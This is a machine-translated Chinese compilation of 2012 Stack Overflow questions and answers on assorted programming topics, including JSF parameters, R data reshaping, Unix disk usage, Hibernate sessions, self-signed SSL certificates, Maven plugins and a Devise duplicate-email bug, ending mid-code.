# java - JSF 1.1 f:param 在 WAS 5 中不起作用

> ID：13061701
> 
> 赞同：0
> 
> 时间：2012-10-25T04:44:57.417
> 
> 标签：java, jsf, websphere, rad

我在 WAS 5（Websphere Application Server 5）中使用 JSF 1.1，我需要知道我的 HtmlDataTable 中的哪个列被点击了，我尝试了很多方法但我无法获得成功的结果，我唯一需要的是将参数传递给动作。

我有类似的东西

```
<h:form>
<h:datatable value=#{bean.list} var="row">
       <h:column>
            <f:facet name="header">
                        <h:outputText value=""/>
                    </f:facet>  
            <h:commandButton value="Test!" action="#{bean.saludar}">
                  <f:param name="cod" value="#1"/>
            </h:commandButton>
       </h:column>
</h:datatable>
</h:form> 
```

在我的 BackingBean 我有

```
public class Bean {
       ......
       ......
     public String saludar() {

           FacesContext context = FacesContext.getCurrentInstance();
           Object value = context.getExternalContext().getRequestMap().get("cod");
           //value IS NULL !!!!!!!!!!!!!!!!!!! HELP HERE OR BEFORE ....
     }

} 
```

我尝试了很多方法，我不知道问题是否是因为我在 HtmlDataTable 或类似的东西中，我可以通过将 de 表绑定到一个 HtmlDataTable 并访问方法 table.getRowData(); 来知道选定的行；我有将近 3 天我找不到解决方案，我已经在 J​​SF 1.2 中使用 Glassfish 3.1 进行了测试并且它有效，但我不知道如何在 WAS 5 中使用 Java 1.4 进行测试

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T14:21:13.850

在 JSF 1.x`<f:param>`中，命令按钮不支持 。此支持仅从 JSF 2.0 开始。

有几种方法可以实现您的具体要求（顺便说一句，知道单击的列的要求很奇怪，也许您说“列”时实际上是指“行”？）。

1.  使用`<h:commandLink>`而不是`<h:commandButton>`. 它支持`<f:param>`.
2.  使用`<f:setPropertyActionListener>`而不是`<f:param>`.
3.  使用`UIData#getRowData()`or`DataModel#getRowData()`来获取当前行。
4.  安装 JBoss EL 并像这样直接传递行本身`action="#{bean.saludar(row)}"`。

### 也可以看看：

*   [JSF 中的通信](http://balusc.blogspot.com/2006/06/communication-in-jsf.html)
*   [使用数据表（在 JSF 1.x 中）](http://balusc.blogspot.com/2006/06/using-datatables.html)
*   [在 JSF 1.2 中通过 EL 调用带参数的方法](https://stackoverflow.com/questions/8325298/invoking-methods-with-parameters-by-el-in-jsf-1-2/)

# java - Java基础：创建类对象

> ID：13061710
> 
> 赞同：1
> 
> 时间：2012-10-25T04:45:49.537
> 
> 标签：java, c++

在 C++ 中：

```
class Rectangle {
    int x, y;
  public:
    void set_values (int,int);
    int area () {return (x*y);}
};

int main () {
  Rectangle rect;
  rect.set_values (3,4);
} 
```

在 Java 中：

```
class Rectangle {
    int x, y;
    void set_values (int x,int y);
    int area () {return (x*y);}
}

public static void main(String[] args) {

Rectangle rect=new Rectangle(3,4);

} 
```

在 C++ 编译器将创建`rect`对象并保留 4 个字节的内存。我想知道Java是如何创建对象的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T04:52:31.430

当你这样做时： -

```
Rectangle rect; 
```

在**C++**中，它调用编译器提供的 0-arg 默认构造函数。

如果您想使用 2-arg 构造函数，则必须执行以下操作：-

```
Rectangle rect(3, 4); 
```

其中，您必须显式提供一个 2-arg 构造函数，否则它将无法编译。

* * *

现在，Java 中的情况也类似。如果你这样做： -

```
new Rectangle(); 
```

那么它就可以了，因为在这种情况下，编译器将为您提供一个默认的 0-arg 构造函数，就像在 C++ 中一样，但是当您创建对象时：-

```
new Rectangle(3, 4); 
```

然后你必须显式地为类提供一个 2-arg 构造函数，否则它不会编译，就像你的第二个例子一样，它不会编译。

此外，一旦您提供了`parameterized constructor`，那么在这种情况下，编译器将不会提供默认构造函数。如果您想使用一个，则必须显式提供一个 0-arg 构造函数。这在两者中都足够了，`Java`并且`C++`

现在，根据`memory allocation`所关心的，由于 Java 是独立于平台的，所以`int`类型的大小是`32 bits`, 在所有平台上。这与`C++`数据类型的大小取决于平台的情况形成对比。

有关[**`JVM Specification - The Structure of JVM`**](http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-2.html)各种类型分配的详细信息，请参阅。

**PS**： -

我建议您通过以下链接了解 Java 类和对象的基础知识：-

*   [http://docs.oracle.com/javase/tutorial/java/javaOO/index.html](http://docs.oracle.com/javase/tutorial/java/javaOO/index.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T04:53:42.393

`32`或`64`位：

```
Rectangle rect 
```

保留在堆栈上。

然后，`32 + 32 = 64 bits`从堆中分配给：

```
new Rectangle(3,4); 
```

Java 是一种独立于平台的语言，所有原始类型都有特定的大小。

请在此处查看：http: [//docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T05:08:48.097

在java`rect`中不是一个对象，而是一个`reference`指向`object`.

当你说它会在里面`new Rectangle(3,4);`创建一个并返回那个，并且引用地址是一个适当类型的变量，这就是你的情况。`object``heap``reference address``object``assigned``Rectangle` `rect`

![在此处输入图像描述](../Images/df926243a50bb9bbf4d4b3f7a7496a97.png)

[java中的](http://docs.oracle.com/javase/tutorial/java/javaOO/objectcreation.html)资源创建对象

# symfony - 你把你的主页放在 Symfony2 项目中的什么位置？

> ID：13061731
> 
> 赞同：2
> 
> 时间：2012-10-25T04:48:04.080
> 
> 标签：symfony, bundle

正如 Symfony2 所说，框架中的一切都是捆绑的。因此，您的网站也将是一个捆绑包。据我从[http://symfony.com/doc/current/cookbook/bundles/best_practices.html](http://symfony.com/doc/current/cookbook/bundles/best_practices.html)了解到，bundle 代表一个功能，这意味着每次我想添加新功能时，我都必须创建一个新包.

例如，我想创建一个具有博客功能和活动功能的网站。然后我将有 2 个捆绑包，BlogBu​​ndle 和 EventBundle。每个与 Blog 相关的代码都将存放在 BlogBu​​ndle 下，而 Event 则存放在 EventBundle 中。

我的问题是，我应该把主页放在哪里？或者可能是另一个页面，如联系方式、关于、条款和政策等......？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T06:26:56.583

请参阅这两个问题以及我对它们的回答：

*   [Symfony2 概念问题：一般捆绑包与特定捆绑包](https://stackoverflow.com/q/8012191/745188)
*   [Symfony 2 中的所有东西都应该是一个捆绑包吗？](https://stackoverflow.com/q/9999433/745188)

**TL;博士**

创建一个名为特定应用程序的捆绑包`AppBundle`，以避免关于放置然后找到实体的核心决策过程。

# r - 在R中将数据帧重塑为长格式

> ID：13061737
> 
> 赞同：4
> 
> 时间：2012-10-25T04:48:27.313
> 
> 标签：r, reshape

我正在为 R 中的重塑而苦苦挣扎。我有 2 种类型的错误（err 和 rel_err）已针对 3 个不同的模型进行了计算。这给了我总共 6 个错误变量（即 err_1、err_2、err_3、rel_err_1、rel_err_2 和 rel_err_3）。对于这些类型的错误中的每一种，我都有 3 种不同类型的预测有效性测试（即随机保留、回溯、预测）。我想让我的数据集很长，所以我保持 4 种类型的测试很长，同时也让两个错误测量很长。所以最后我将有一个名为 err 的变量和一个名为 rel_err 的变量，以及一个用于错误对应的模型的 id 变量（1、2 或 3）

这是我现在的数据：

```
iter       err_1  rel_err_1      err_2  rel_err_2      err_3  rel_err_3 test_type
1 -0.09385732 -0.2235443 -0.1216982 -0.2898543 -0.1058366 -0.2520759    random
1  0.16141630  0.8575728  0.1418732  0.7537442  0.1584816  0.8419816    back
1  0.16376930  0.8700738  0.1431505  0.7605302  0.1596502  0.8481901    front
1  0.14345986  0.6765194  0.1213689  0.5723444  0.1374676  0.6482615    random
1  0.15890059  0.7435382  0.1589823  0.7439204  0.1608709  0.7527580    back
1  0.14412360  0.6743928  0.1442039  0.6747684  0.1463520  0.6848202    front 
```

这就是我希望它的样子：

```
iter     model    err           rel_err    test_type
1        1        -0.09385732    (#'s)     random
1        2        -0.1216982     (#'s)     random
1        3        -0.1216982     (#'s)     random 
```

然后……

我已经尝试过使用语法，但无法完全弄清楚 time.variing 参数应该放什么

非常感谢您提供的任何帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-25T11:24:37.963

你可以用“硬”的方式来做。为了透明度，您可以使用名称。

```
with( dat, data.frame(iter = rep(iter, 3), 
      model = rep(1:3, each = nrow(dat)),
      err = c(err_1, err_2, err_3), 
      rel_err = c(rel_err_1, rel_err_2, rel_err_3), 
      test_type = rep(test_type, 3)) ) 
```

或者，为了简洁，索引。

```
data.frame(iter = dat[,1], model = rep(1:3, each = nrow(dat)), err = dat[,c(2, 4, 6)], 
          rel_err = dat[,c(3, 5, 7)], test_type = dat[,8]) ) 
```

如果您有很多列，那么困难的方法可能涉及对列名进行 grepping。

这种“硬”方式与如何使用命令一样简洁，`reshape`并且不需要考虑如何使用这些命令。有时我只是跳过思考`reshape`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-25T05:12:27.387

基本功能`reshape`将让你做到这一点

```
reshape(DT, direction = 'long', varying = list(paste('err',1:3,sep ='_'), paste('rel_err',1:3,sep ='_')), v.names = c('err','rel_err'), timevar = 'model')
    iter test_type model         err    rel_err id
1.1    1    random     1 -0.09385732 -0.2235443  1
2.1    1      back     1  0.16141630  0.8575728  2
3.1    1     front     1  0.16376930  0.8700738  3
4.1    1    random     1  0.14345986  0.6765194  4
5.1    1      back     1  0.15890059  0.7435382  5
6.1    1     front     1  0.14412360  0.6743928  6
1.2    1    random     2 -0.12169820 -0.2898543  1
2.2    1      back     2  0.14187320  0.7537442  2
3.2    1     front     2  0.14315050  0.7605302  3
4.2    1    random     2  0.12136890  0.5723444  4
5.2    1      back     2  0.15898230  0.7439204  5
6.2    1     front     2  0.14420390  0.6747684  6
1.3    1    random     3 -0.10583660 -0.2520759  1
2.3    1      back     3  0.15848160  0.8419816  2
3.3    1     front     3  0.15965020  0.8481901  3
4.3    1    random     3  0.13746760  0.6482615  4
5.3    1      back     3  0.16087090  0.7527580  5
6.3    1     front     3  0.14635200  0.6848202  6 
```

我同意`reshape`有时很难理解的语法。我会详细说明这个电话是如何工作的

*   `direction = 'long'` -- 重塑为`long`格式
*   `varying = list(paste('err',1:3,sep ='_'), paste('rel_err',1:3,sep ='_'))`-- 我们传递一个长度为 2 的列表，因为我们试图堆叠成两个不同的变量。列`paste('err',1:3,sep ='_')`将成为长格式的第一个新变量， `paste('rel_err',1:3,sep ='_'))`并将成为长格式的第二个新变量
*   `v.names = c('err','rel_err')`以长格式设置两个新变量的名称
*   `timevar = 'model'`设置时间标识符的名称（这里是`_1`宽格式的列。

我希望这更清楚一些。

# r - 剪切和标签/中断长度冲突

> ID：13061738
> 
> 赞同：15
> 
> 时间：2012-10-25T04:48:28.963
> 
> 标签：r, cut

我正在使用 cut 函数为条形图直方图准备数据，但在我的标签和中断之间不断遇到看似不一致的情况：

`Error in cut.default(sample(1:1e+05, 500, T), breaks = sq, labels = sprintf("$%.0f", : labels/breaks length conflict`

这是一个例子。我假装它是收入数据，在 10,000 美元的箱子中使用 0 到 100,000 美元的序列。我使用相同的变量来生成中断和标签，并在标签侧进行次要格式。我认为与字符向量相比，它们可能由于某种原因具有不同的长度，但它们似乎仍然具有相同的长度。

```
> sq<-seq(0,100000,10000)
> cut(sample(1:100000, 500, T),breaks=sq,labels=sprintf("$%.0f",sq))
> length(sprintf("$%.0f",sq))
[1] [11]
> length(sq)
[1] [11] 
```

**编辑：**

根据@thelatemail 和@Josh O'Brien 的建议，我将代码更改为此，一切正常。 `cut(sample(1:100000, 500, T),breaks=sq,labels=sprintf("$%.0f",sq[-1]))`

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-10-25T04:58:28.947

使用`cut()`, 11 个中断分隔 10 个级别，这将只需要 10 个标签。该`"labels/breaks length conflict"`错误告诉您调用为参数`sprintf()`提供了太多标签`labels=`。

在代码中：

```
breaks <- 0:10/10
dat <- runif(1e4)

length(breaks)
# [1] 11
length(levels(cut(breaks, sq)))
# [1] 10 
```

# linux - 在 unix 中查找目录的大小

> ID：13061742
> 
> 赞同：4
> 
> 时间：2012-10-25T04:48:54.533
> 
> 标签：linux, unix

**问题陈述：-**

我得到这个例外 -

```
org.apache.hadoop.hdfs.protocol.DSQuotaExceededException:
org.apache.hadoop.hdfs.protocol.DSQuotaExceededException: The DiskSpace 
quota of /tmp is exceeded: quota=659706976665600 diskspace consumed=614400.1g 
```

所以我只想知道当前 /tmp 目录的大小是多少，因此我遇到了这个异常。如何查看 /tmp 中的可用空间？

**更新：-**

```
bash-3.00$ df -h /tmp
Filesystem             size   used  avail capacity  Mounted on
rpool/tmp               10G   2.2G   7.8G    22%    /tmp 
```

我现在很困惑为什么我会得到那个异常，因为它在上面清楚地说明我有可用空间。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-25T04:51:39.183

你可以做（​​对于 SunOS）

```
# du -sh /tmp 
```

看看它现在用了多少，但你已经看到了。

`/tmp`要查看您可以使用的分区上有多少总空间、可用空间和已用空间：

```
# df -h /tmp 
```

请注意，填充空间并不是唯一可以阻止写入文件系统的事情。

用尽 inode 是另一个流行的原因。

你可以检查一下

```
# df -i /tmp 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-27T06:15:14.397

对于一个 in `ls`; do du -ch ${a} | grep 总计；回声 ${a}; 完毕

试试这个，但如果 dir 的大小以 GB 为单位，则需要时间

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-06-30T08:38:28.657

管理 HDFS 空间配额 重要的是要了解在 HDFS 中，必须有足够的配额空间来容纳整个块。如果用户在分配的配额中有 200MB 空闲空间，则无论文件大小如何，如果 HDFS 块大小恰好为 256MB，他们都无法创建新文件。您可以通过执行 setSpace-Quota 命令为用户设置 HDFS 空间配额。这是语法：

```
$ hdfs dfsadmin –setSpaceQuota <N> <dirname>...<dirname> 
```

您设置的空间配额作为目录中所有文件总大小的上限。您可以以字节 (b)、兆字节 (m)、千兆字节 (g)、太字节 (t) 甚至 PB 为单位设置空间配额（通过指定 p——是的，这是大数据！）。下面是一个示例，展示了如何将用户的空间配额设置为 60GB：

```
$ hdfs dfsadmin -setSpaceQuota 60G /user/alapati 
```

您可以一次在多个目录上设置配额，如下所示：

```
$ hdfs dfsadmin -setSpaceQuota 10g /user/alapati /test/alapati 
```

# spring - 如何在 Thread 中访问休眠会话？

> ID：13061746
> 
> 赞同：4
> 
> 时间：2012-10-25T04:49:16.830
> 
> 标签：spring, hibernate

由于休眠会话不是线程安全的，我无法通过 sessionFactory.getCurrentSession(); 获取当前休眠会话；

如果我选择 sessionFactory.openSession(); 它适用于线程本身，但对于嵌套类[从线程调用]，它不允许我访问同一个新打开的会话 [抛出“当前线程未找到会话”异常]。

我正在使用 Spring 3.1.1 和 Hibernate 4.1.3

有没有办法在线程中获取当前会话？

或者有什么方法可以将新打开的会话访问到从线程调用的嵌套类？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T06:33:22.973

当您使用 Spring 和 hibernate 时，`sessionFactory.getCurrentSession();`如果您在事务中使用它，您将使用当前会话。否则，您将收到消息异常：`No Session found for current thread`。

例如：

```
void someDBOperation() {
   Session session = sessionFactory.getCurrentSession(); // if not in transaction, exception : No Session found for current thread
   // some code
} 
```

```
@Transactional  // use either annotated approach or xml approach for transaction
void someDBOperation() {
   Session session = sessionFactory.getCurrentSession(); // you will get session here
   // some code
} 
```

# javascript - Javascript 带有用户名的感谢页面

> ID：13061748
> 
> 赞同：-2
> 
> 时间：2012-10-25T04:49:33.633
> 
> 标签：javascript

我有一个表单，用户可以在其中输入姓名和其他联系信息。我验证输入，然后重定向到感谢页面。我想通过将用户名显示为感谢信的一部分来个性化页面。我尝试 document.getElementById(Name1).value 来检索 Name 的值，但它给出了未定义的值。有没有办法让我将 Name1 字段的值设置为我再次调用的另一个变量以将其包含在我的短信中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:58:25.640

你得到`undefined`是因为在感谢页面中，你没有表格了。最好的方法是在服务器端。

如果您坚持完全在客户端执行此操作，那么您可能需要一些技巧。一个想法是使用`window.location.hash`@MateiMihai 提到的。另一个想法是使用在客户端保存值的本地存储。这可能会有所帮助： http: [//www.jstorage.info/](http://www.jstorage.info/)

# ssl - 我的公司强制执行 SSL 邮件加密，但让我们信任自签名证书 - 这是错误的吗？

> ID：13061751
> 
> 赞同：0
> 
> 时间：2012-10-25T04:50:00.563
> 
> 标签：ssl, ssl-certificate, email-client

当通过电子邮件客户端连接到邮件服务器时，我们被迫使用 SSL。然而，我们只有一个 IT 部门希望我们信任的自签名证书。

真正的安全影响是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T05:02:56.993

假设根密钥没有泄漏，这会破坏整个公司的 CA 系统，唯一特定于*这种使用*自签名证书的问题是分发；证书颁发机构证书通常已经在需要连接到服务器的任何计算机上，而此证书需要手动分发。

如果一台新计算机需要连接到服务器并且没有证书，那么如果您仍然连接并且只接受证书，那么就*没有真正的安全性。*要使它有任何用途，它必须*已经存在于计算机上*。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T05:32:08.377

正如其他两个所说，它基本上取决于您对公司的信任程度，无论如何这都是一个因素，所以这可能没什么大不了的（尽管他们可以轻松地从 startcom 获得免费的 SSL 证书，所以我不知道为什么他们会坚持自签名）。

但正如 Paul 在他的示例中所概述的，如果他们让您在您的计算机上安装自己的根证书也很重要；如果他们不这样做，而是每次都要求您单击警告框，我建议您大声说出来，并将此页面的链接通过电子邮件发送给您公司的 IT 部门。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T05:23:45.493

这是一个比看起来更复杂的问题。简短的回答是，如果他们在保护其自签名根 CA 并将根部署到客户端计算机（非常重要！）方面遵循最佳实践，那么除了 X509 PKI 通常会产生的风险之外，没有其他风险。

更长的答案是，像往常一样，“这取决于他们削减了哪些角落”。这是风险更高的情况...

> 贵公司不直接在员工笔记本电脑上安装自签名根。当被问及这种疏忽时，他们说“这是异构计算环境中的真正 PITA”。这（取决于客户端和其他因素）迫使您在每次启动客户端时选择通过不受信任的对话框单击“继续”。大不了吧？它仍然是加密的。有一天你在马德里，在一家五星级酒店享受客房服务（作为公司内的一颗冉冉升起的新星，你得到了最豪华的任务），然后你打开你的笔记本电脑完成一些工作......
> 
> 你总是连接到 VPN，但是你上次让笔记本电脑进入睡眠状态时让你的邮件客户端保持打开状态，它会抛出同样令人讨厌的警告，它总是在你打开它时显示。您可以快速单击对话框，因为您的 IT 部门已对您进行了培训。可悲的是，这次是不同的证书。如果您直接检查过它（您有过目不忘的记忆并且喜欢比较 base64 编码的公钥），您不会点击，但您很着急，现在运行酒店捕获门户的无良酒店经理知道您的电子邮件登录名和密码 (p@ssw0rd1)。
> 
> 不幸的是，您在各种其他网站上使用 p@ssw0rd1，因此您发现您的 reddit、amazon 甚至 stackoverflow 帐户都被迅速入侵。更糟糕的是，你的老板会收到一封来自“你”的电子邮件，其中包含淫秽的咆哮和辞职通知。这一切都是因为您点击了之前已经点击过一千次的无害对话框。

当盲目地单击“不受信任的证书”对话框时，这种（不太可能的）情况是可能的。可以（希望）对用户进行培训以避免这种情况，方法是告诉他们不要单击此类对话框并将公司 CA 添加到操作系统/浏览器的受信任根列表中或使用受信任的公共 CA。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-10-25T05:38:48.080

如果您希望对此做任何事情，例如单击接受证书的对话框，那是错误的。

如果他们正确地完成了他们的工作，他们应该在内部分发证书，以便所有需要的网络元素都已经信任它，例如浏览器、邮件用户代理、应用程序......

换句话说，如果你知道它，那就错了。

# javascript - 在 Rails 中的表单上切换一组输入

> ID：13061752
> 
> 赞同：0
> 
> 时间：2012-10-25T04:50:05.393
> 
> 标签：javascript, ruby-on-rails, forms, haml

我在 Rails 应用程序中有一个包含邀请码和信用卡信息块的表单。我希望能够在同一页面上的两者之间切换。用户要么提供邀请码**，要么**输入信用卡信息。如果一个或另一个可以在不活动时隐藏（但不是必需的），那就太好了。这是表格的相关位：

```
 %hr

  %fieldset
    .control-group
      = label_tag :invite_code, nil, :class => "control-label"

      .controls
        = text_field_tag :invite_code

    .control-group
      .controls
        = f.hidden_field :stripe_token
        = f.hidden_field :last_4_digits

    - if @user.last_4_digits
      .control-group
        = label_tag :card, nil, :class => "control-label"
        .controls
          Using card ending with #{@user.last_4_digits}
          = link_to "(change)", "#"

  %hr

  %fieldset
    %noscript
      %p
        This form requires Javascript to use

    .control-group#credit-card{ :style => @user.last_4_digits ? "display:none" : "display:block" }
      #credit-card-errors{:style => "display:none"}
        #stripe-error-message.alert-message.block-message.error

      .control-group
        = label_tag :credit_card_number, nil, :class => "control-label"
        .controls= text_field_tag :credit_card_number, params[:credit_card_number], :class => "field", :disabled => true 

      .control-group
        = label_tag :cvv, "Security code (CVV)", :class => "control-label"
        .controls= text_field_tag :cvv, params[:cvv], :class => "small", :disabled => true 

      .control-group
        = label_tag :expiry_date, nil, :class => "control-label"
        .controls= date_select "", :expiry_date, {:discard_day => true, :order => [:month, :year], :use_month_numbers => true, :start_year => Date.today.year, :end_year => Date.today.year + 25, :disabled => true}, {:class => "input-small"}

      /empty
      %p
        Subscriptions will be billed $12 annually.

  %fieldset.form-submit
    = submit_tag 'Sign up', :class => 'btn btn-large btn-primary' 
```

这样做最明智的方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T10:00:44.597

首先将 CSS id 或类添加到不同的字段集

```
%fieldset#card
...
%fieldset#invite
... 
```

使用一个名为 hidden 的 CSS 类

```
.hidden {
  display:none;
} 
```

并将其添加为邀请字段集的默认值

```
%fieldset#invite.hidden 
```

然后添加您的“有邀请？” 关联

```
%a{ :class => "have_invite" } 
```

然后沿着这些线一些jquery

```
var show_invite_form = function(){
    $("#invite").removeClass("hidden");
    $("#card").addClass("hidden");
};
$(".have_invite").click(show_invite_form); 
```

如果你想要它更花哨，你可以开始查看 jquery 的淡入淡出和动画方法。

# sql - oracle apex 报表行缩进

> ID：13061756
> 
> 赞同：1
> 
> 时间：2012-10-25T04:50:22.283
> 
> 标签：sql, oracle-apex

有人可以告诉我如何在顶点报告中保持缩进，就像这个查询的结果一样？

```
select  lpad(' ',2*level-1)||ename as ename
from    emp
start   with mgr is null
connect by nocycle prior empno = mgr; 
```

它看起来像 apex 报告将所有缩进选项卡和显示报告修剪为通常的行。

之前谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T07:12:11.650

如果您想使用空格作为缩进，请尝试使用以下内容：

```
select  replace(lpad('#', level*2, '#'),'#','&nbsp;')|| ename as ename
from    emp
start   with mgr is null
connect by nocycle prior empno = mgr 
```

并将 ename 列的“显示为”属性更改为“标准报告列”，以便显示 html 标记

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T08:37:46.177

我发现这个真的很有用:)

```
Report Attributes > Column Attributes for ?ENAME? > 
Column Formatting > HTML Expression 
<span style="padding-left:#THE_LEVEL#px;">#ENAME#</span> 
```

# project-management - 什么是故事点

> ID：13061757
> 
> 赞同：0
> 
> 时间：2012-10-25T04:50:33.957
> 
> 标签：project-management, agile

我正在经历一个项目的速度的定义。据我了解，它是迭代中实现的故事点数与计划的故事点数。我不清楚什么是故事点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:55:19.197

故事点是分配给特定任务或故事的“任意”工作单元。

它可以是团队（或团队领导）估计的任务/故事将花费的工时数，但也可以是任何其他工作/时间单位。
用于故事点的特定单位在某种意义上有些随意，甚至不需要转换为精确的工时（或工作日等）。唯一的要求是故事点***以一致的方式*****反映每个任务或故事所需的估计工作量***。*

 *如果故事点以如此一致的方式分配，故事点将成为衡量整个项目进度的有用指标。此外，如果程序员在给定的时间范围内（例如在 2 周的“冲刺”中）可以执行的工作量以故事点表示，则可以计划在冲刺期间可以交付的故事列表（如果一切顺利;-) )

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T04:58:54.623

故事点是 Scrum 用来估计故事工作量的东西。这是一个任意的度量，例如工时，或者一个简单的`{easy-peasy, one-for-the-graduate, medium, guru, crikey-thats-a-toughie, near-impossibility}`（`{1, 3, 9, 27, 81}`某种事情）选择。

因此，一个相当简单的故事（你好，世界）可能是一个故事点，而一个更复杂的故事（Facebook 克隆）可能会更多。

真正优秀的团队会保留故事的历史和他们的观点（估计的和实际的）。

这样，您就可以找到与您正在估计的故事相似的较早故事，并使用其*实际*点数（在故事完成后找到）作为当前故事的基线。

有关更多详细信息，请参阅[敏捷常见问题解答中的此条目](http://agilefaq.wordpress.com/2007/11/13/what-is-a-story-point/)，或查看许多其他好东西[的首页。](http://agilefaq.wordpress.com/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T09:28:07.700

用于衡量团队速度的是故事的复杂性。通常情况下，故事需要的时间并不精确，因为当你是一个新的敏捷团队时，你无法特别知道。但随着时间的推移，您将能够更准确地为故事分配一个数字，因为您会随着时间的推移而学习。

由于 point 的主要目的是估计来衡量你的速度，因此你要记住故事的复杂性（例如，实施时间 + 团队技能 + 知识 + 领域经验等）*

# facebook - 我卡在了 facebook 服务器

> ID：13061766
> 
> 赞同：0
> 
> 时间：2012-10-25T04:51:40.790
> 
> 标签：facebook, login

我创建了一个网站，允许用户使用 facebook 登录系统进行注册和登录。系统运行良好。它可以使用单点登录来登录系统，所以用户不需要输入用户名和密码---直到昨天。

一位队友发现他卡在登录系统中，单点登录不再起作用。用户需要输入帐户详细信息，无论他们是否登录 Facebook。最有趣的是，在用户登录 facebook 登录系统后，它不会将用户重定向到“下一个”url 或将他们重定向到 facebook.com（这通常意味着登录系统设置有错误）。它只是卡在 facebook 服务器中，空白页为空。

这是我坚持的链接...... [https://www.facebook.com/login.php?login_attempt=1&fbconnect=1&display=page&next=(next](https://www.facebook.com/login.php?login_attempt=1&fbconnect=1&display=page&next=(next) url)&req_perms=publish_stream%2Cread_stream%2Cemail%2Cuser_photos&legacy_return=1

没有会话代码，也没有任何回复。

我想知道我是否设置了错误...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T07:28:46.090

大约一年前，随着向 OAuth2 的迁移，legacy_return 的使用已被弃用，端点终于在今天关闭。[请根据https://developers.facebook.com/docs/concepts/login/](https://developers.facebook.com/docs/concepts/login/)更新您的集成

# maven - 是否有用于执行常见文件系统操作的 maven 插件？

> ID：13061771
> 
> 赞同：1
> 
> 时间：2012-10-25T04:52:15.483
> 
> 标签：maven, maven-3

我有一个 ant 脚本，它生成一个自定义版本的 tomcat 以在我的服务器上使用。此 ant 脚本执行以下操作：

*   解压缩 tomcat .zip 文件的原始副本
*   删除一堆不用的文件
*   将一堆 jars 添加到 tomcat\lib 文件夹中，例如数据库驱动程序和其他
*   将其全部压缩到一个 zip 文件中

我注意到在[http://maven.apache.org/plugins/maven-antrun-plugin/](http://maven.apache.org/plugins/maven-antrun-plugin/)上有一个用于 maven 的 ant run 插件，但文档表明应该谨慎使用这个 ant run 插件。

哪些 maven 插件可用于执行基本的文件 io 操作，例如复制、解压缩、删除、重命名、移动、压缩等？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T06:51:22.460

对于解压缩文件，最好的解决方案是使用[maven-dependency-plugin](http://maven.apache.org/plugins/maven-dependency-plugin/)进一步打包像 zip 这样的存档，您可以使用[maven-assembly-plugin](http://maven.apache.org/plugins/maven-assembly-plugin/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T08:39:32.697

正如其他人提到的那样，有一些插件，但 maven 的全部意义在于您不需要那些基本的文件操作。Maven 在更高级别的抽象上运行，像在 lib 文件夹中有 jar 等的东西应该通过模块依赖关系来处理，而不是通过显式的复制任务来处理。

如果你想坚持较低级别的“基本文件操作”，ant 比 maven 更好。Maven 旨在通过重新考虑您的方法来尽可能地摆脱这些操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T09:01:50.747

如果您已经有一个可以运行的 ant 脚本，请不要浪费时间重写它。只需使用 antrun 插件。就像 eis 所说，Maven 在更高级别上运行，因此通常您不需要处理文件。

# ruby-on-rails - Devise / ActionMailer 发送重复电子邮件以进行注册确认

> ID：13061775
> 
> 赞同：7
> 
> 时间：2012-10-25T04:52:52.393
> 
> 标签：ruby-on-rails, devise, duplicates, actionmailer, confirmation-email

我的 Rails 应用程序使用设计来处理注册、身份验证等。我正在使用可确认模块。错误是这样的——当用户使用电子邮件注册时，Devise 会发送两封带有不同确认链接的确认电子邮件。一个链接有效，另一个将用户引导至错误页面。

设计吐出与错误相关的消息：“确认令牌无效”并将用户带到重新发送确认电子邮件页面。

我正在使用 heroku 托管并使用 sendgrid 发送电子邮件。**更新：**该错误也发生在本地主机上。

我不知道这个错误的根源在哪里，这可能比你需要看到的代码更多：

**models/user.rb**

```
...

devise :database_authenticatable, :registerable, :omniauthable,
     :recoverable, :rememberable, :trackable, :validatable, 
     :confirmable, :authentication_keys => [:login]

...

## callbacks
after_create :account_created

# called after the account is first created
def account_created

  # check if this activiy has already been created
  if !self.activities.where(:kind => "created_account").blank?
    puts "WARNING: user ##{self.id} already has a created account activity!"
    return
  end

  # update points
  self.points += 50
  self.save

  # create activity
  act = self.activities.new
  act.kind = "created_account"
  act.created_at = self.created_at
  act.save

end

...

def confirmation_required?
  super && (self.standard_account? || self.email_changed)
end

... 
```

**控制器/registrations_controller.rb**

```
class RegistrationsController < Devise::RegistrationsController
  def update
    unless @user.last_sign_in_at.nil?

      puts "--------------double checking whether password confirmation is required--"
      ## if the user has not signed in yet, we don't want to do this.

      @user = User.find(current_user.id)
      # uncomment if you want to require password for email change
      email_changed = @user.email != params[:user][:email]
      password_changed = !params[:user][:password].empty?

      # uncomment if you want to require password for email change
      # successfully_updated = if email_changed or password_changed

